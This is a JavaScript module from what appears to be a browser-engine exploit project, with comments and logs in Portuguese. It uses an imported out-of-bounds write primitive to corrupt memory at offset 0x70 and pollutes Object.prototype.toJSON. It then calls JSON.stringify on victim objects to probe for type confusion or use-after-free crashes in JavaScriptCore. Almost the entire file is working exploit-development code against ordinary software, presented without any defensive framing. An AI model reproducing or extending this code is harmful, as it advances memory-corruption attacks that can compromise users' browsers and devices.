// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs'; // << CORREÇÃO: SHORT_PAUSE_S3 ADICIONADO
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const CRITICAL_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    description: "CrashTest_JSONStringify_OriginalToJSON_0x70_FFFF"
};

let callCount_toJSON_crash_test = 0;

// Esta deve ser a sua função toJSON "v2 - Refinado" que causava o congelamento.
// Certifique-se que a lógica interna dela é exatamente a que você usava.
function originalCrashTest_toJSON() {
    const FNAME_toJSON_local = "originalCrashTest_toJSON_Internal"; 
    callCount_toJSON_crash_test++;
    if (callCount_toJSON_crash_test === 1) {
        document.title = `toJSON Call ${callCount_toJSON_crash_test} (${CRITICAL_PARAMS.description})`;
    }
    const currentOperationThis = this;
    logS3(`[${CRITICAL_PARAMS.ppKey} Poluído - OriginalCrash] Chamada ${callCount_toJSON_crash_test}!`, "vuln", FNAME_toJSON_local);
    logS3(`  [CALL ${callCount_toJSON_crash_test}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info", FNAME_toJSON_local);
    
    let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A" };
    try {
        details.byteLength = currentOperationThis.byteLength;
        if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4 && (currentOperationThis instanceof ArrayBuffer || (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined))) {
            let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
            let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : currentOperationThis.byteOffset;
            if (bufferToView.byteLength >= offsetInView + 4) {
               details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
            } else { details.first_dword = "Buffer pequeno demais"; }
        } else { details.first_dword = "Não é AB/buffer válido"; }
        details.slice_exists = (typeof currentOperationThis.slice === 'function');
        if (details.slice_exists) { logS3(`  [CALL ${callCount_toJSON_crash_test}] this.slice existe.`, "info", FNAME_toJSON_local); }
        logS3(`  [CALL ${callCount_toJSON_crash_test}] Detalhes: byteLength=${details.byteLength}, 1stDword=${details.first_dword === "N/A" ? "N/A" : toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info", FNAME_toJSON_local);
        return { toJSON_executed: true, type: Object.prototype.toString.call(currentOperationThis), details: details, call: callCount_toJSON_crash_test };
    } catch (e) {
        logS3(`  [CALL ${callCount_toJSON_crash_test}] ERRO em toJSON: ${e.message}`, "critical", FNAME_toJSON_local);
        document.title = `ERRO toJSON Call ${callCount_toJSON_crash_test}`;
        return { toJSON_error: true, message: e.message, call: callCount_toJSON_crash_test };
    }
}

export async function runOriginalCrashTest_FocusStringify() {
    const FNAME = CRITICAL_PARAMS.description; // Usando o nome da descrição como FNAME para os logs principais
    logS3(`--- Iniciando Teste de Crash Original com Foco em JSON.stringify: ${FNAME} ---`, "test", FNAME);
    document.title = "Iniciando: " + FNAME;

    callCount_toJSON_crash_test = 0;
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME); 
        document.title = "ERRO OOB Setup - " + FNAME;
        return;
    }
    document.title = "OOB OK - " + FNAME;

    let victim_ab = new ArrayBuffer(CRITICAL_PARAMS.victim_ab_size);
    logS3(`victim_ab criado.`, "info", FNAME);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, CRITICAL_PARAMS.ppKey);
    let pollutionApplied = false;
    let stepReached = "antes_pp";

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${CRITICAL_PARAMS.ppKey}...`, "info", FNAME);
        document.title = "Aplicando PP - " + FNAME;
        Object.defineProperty(Object.prototype, CRITICAL_PARAMS.ppKey, {
            value: originalCrashTest_toJSON,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = "PP OK - " + FNAME;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO: ${toHex(CRITICAL_PARAMS.value_to_write)} @ ${toHex(CRITICAL_PARAMS.corruption_offset)}`, "warn", FNAME);
        document.title = "Antes OOB Write - " + FNAME;
        oob_write_absolute(CRITICAL_PARAMS.corruption_offset, CRITICAL_PARAMS.value_to_write, CRITICAL_PARAMS.bytes_to_write_for_corruption);
        logS3("Escrita OOB feita.", "info", FNAME);
        stepReached = "apos_escrita_oob";
        document.title = "Após OOB Write - " + FNAME;

        await PAUSE_S3(SHORT_PAUSE_S3); // <<< PAUSA CURTA QUE CAUSOU O ERRO ANTERIOR

        let simpleVictims = [
            { name: "EmptyObject", victim: {} },
            { name: "SimpleObject", victim: { a: 1, b: "test" } },
            { name: "EmptyArray", victim: [] },
            { name: "OriginalVictimAB", victim: victim_ab } 
        ];

        for (const sv of simpleVictims) {
            stepReached = `antes_stringify_${sv.name}`;
            document.title = `Antes Strfy ${sv.name} - ${FNAME}`;
            logS3(`Chamando JSON.stringify para ${sv.name}...`, "info", FNAME);
            callCount_toJSON_crash_test = 0; 
            let currentStringifyResult = null;
            try {
                currentStringifyResult = JSON.stringify(sv.victim); 
                stepReached = `apos_stringify_${sv.name}`;
                document.title = `Strfy OK ${sv.name} - ${FNAME}`;
                logS3(`Resultado JSON.stringify(${sv.name}): ${String(currentStringifyResult).substring(0, 100)}... (Chamadas toJSON: ${callCount_toJSON_crash_test})`, "info", FNAME);
            } catch (e) {
                stepReached = `erro_stringify_${sv.name}`;
                document.title = `ERRO Strfy ${sv.name} - ${FNAME}`;
                logS3(`ERRO JSON.stringify(${sv.name}): ${e.name} - ${e.message}. (Chamadas toJSON: ${callCount_toJSON_crash_test})`, "critical", FNAME);
                console.error(`JSON.stringify ERROR for ${sv.name}:`, e);
                if (document.title.startsWith("ERRO Strfy") || document.title.startsWith("CONGELOU?")) {
                     logS3(`Problema detectado com ${sv.name}, parando demais testes de stringify.`, "error", FNAME);
                     break; 
                }
            }
            if (document.title.startsWith("CONGELOU?")) break; // Parar se congelar
            await PAUSE_S3(SHORT_PAUSE_S3);
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = "ERRO Principal - " + FNAME;
        console.error("Main test error:", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, CRITICAL_PARAMS.ppKey, originalToJSONDescriptor);
            else delete Object.prototype[CRITICAL_PARAMS.ppKey];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}`, "info", FNAME);
        if (stepReached !== "apos_stringify_OriginalVictimAB" && !stepReached.startsWith("erro_") && !document.title.startsWith("ERRO") && !document.title.startsWith("Strfy OK")) {
             document.title = `CONGELOU? ${stepReached} - ${FNAME}`;
        }
    }
    logS3(`--- Teste de Crash Original Concluído: ${FNAME} ---`, "test", FNAME);
     if (document.title.startsWith("Iniciando") || document.title.startsWith("OOB OK") || document.title.startsWith("Aplicando PP") || document.title.startsWith("PP OK") || document.title.startsWith("Antes OOB Write") || document.title.startsWith("Após OOB Write")) {
        document.title = `Teste Crash Concluído (${stepReached}) - ${FNAME}`;
    }
}

export async function testJsonTypeConfusionUAFSpeculative() { // Mantendo a exportação original
    await runOriginalCrashTest_FocusStringify();
}
